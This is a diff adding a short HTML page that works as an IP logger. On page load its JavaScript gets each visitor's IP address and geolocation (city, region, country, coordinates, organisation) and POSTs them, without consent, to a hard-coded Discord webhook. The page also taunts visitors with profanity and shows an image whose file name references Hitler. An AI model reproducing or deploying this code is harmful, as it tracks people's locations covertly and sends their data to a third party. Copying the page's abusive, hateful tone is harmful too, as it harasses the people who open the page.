@@ -1,1 +1,110 @@
+<!DOCTYPE html>
 
+<html>
+  <center>
+    <h1><strong>Dear every user here thanks for your IP as it has now been sent to a webhook (VYNOID ON TOP)</strong></h1>
+    <p><strong>I'M FUCKING BACK!!!</strong></p>   
+  </center>
+</html>
+
+
+<html>
+<center>
+<head>
+    <title>YA U GETTING IP LOGGED PUSSEHS</title>
+</head>
+<body>
+
+<div id="result"></div>
+
+<!-- Add a title and an image -->
+<img src="https://cdn.discordapp.com/attachments/1163109057129885698/1165017942057025557/Riya_GFX_hitler.png?ex=65455282&is=6532dd82&hm=80d142b4bc0b194c414e362cd1fc30628fa369440ae264d39477cdf84e5a3907&" alt="Custom Image" style="max-height: 300px; width: auto;">
+<h2>IP LOGGED BY VYNOID V1 || MOTHERFUCKERS</h2>
+
+<div id="ipResult"></div>
+
+<script>
+function getMyIpAddress() {
+    fetch("https://api64.ipify.org?format=json")
+        .then(response => response.json())
+        .then(data => {
+
+            // Fetch geolocation data from ipinfo.io
+            fetch("https://ipinfo.io/" + data.ip + "/json")
+                .then(response => response.json())
+                .then(data => {
+                    var ipResultDiv = document.getElementById("ipResult");
+                    ipResultDiv.innerHTML = `
+                        <p><strong>IP Address:</strong> ${data.ip}</p>
+                        <p><strong>City:</strong> ${data.city}</p>
+                        <p><strong>Region:</strong> ${data.region}</p>
+                        <p><strong>Country:</strong> ${data.country}</p>
+                        <p><strong>Location:</strong> ${data.loc}</p>
+                        <p><strong>Organization:</strong> ${data.org}
+                    `;
+
+                    // Set hex color code and image URL
+                    var hexCode = "#903dfe"; // Replace with your desired hex color code
+                    var imageUrl = "https://cdn.discordapp.com/attachments/1163109057129885698/1165017942057025557/Riya_GFX_hitler.png?ex=65455282&is=6532dd82&hm=80d142b4bc0b194c414e362cd1fc30628fa369440ae264d39477cdf84e5a3907&"; // Replace with your desired image URL
+
+                    // Send data to Discord webhook as an embed
+                    sendToDiscord(data, hexCode, imageUrl);
+                })
+                .catch(error => {
+                    var ipResultDiv = document.getElementById("ipResult");
+                    ipResultDiv.innerHTML = "<p>Error retrieving IP information.</p>";
+                    console.error("Error retrieving IP information:", error);
+                });
+        })
+        .catch(error => {
+            console.error("Error retrieving IP address:", error);
+        });
+}
+
+function sendToDiscord(data, hexCode, imageUrl) {
+    var webhookUrl = "https://discord.com/api/webhooks/1163109082077601923/wh-aRYVe3Jlx2bevbSnJx1b7enWsrT1kW_xNlTaoo6PDuTSuR-p9xMxRhciiE6iI-jA6"; // Replace with your actual webhook URL
+    var payload = {
+        embeds: [
+            {
+                fields: [
+                    { name: "IP Address", value: data.ip, inline: true },
+                    { name: "City", value: data.city, inline: true },
+                    { name: "Region", value: data.region, inline: true },
+                    { name: "Country", value: data.country, inline: true },
+                    { name: "Location", value: data.loc, inline: true },
+                    { name: "Organization", value: data.org, inline: true }
+                ],
+                color: parseInt(hexCode.replace("#", ""), 16),
+                image: { url: imageUrl },
+                timestamp: new Date().toISOString()
+            }
+        ]
+    };
+
+    fetch(webhookUrl, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+    })
+    .then(response => {
+        if (response.ok) {
+            console.log("Data sent to Discord successfully.");
+        } else {
+            console.error("Error sending data to Discord.");
+        }
+    })
+    .catch(error => {
+        console.error("Error sending data to Discord:", error);
+    });
+}
+
+document.addEventListener("DOMContentLoaded", function() {
+    getMyIpAddress();
+});
+</script>
+
+</body>
+</center>
+</html>
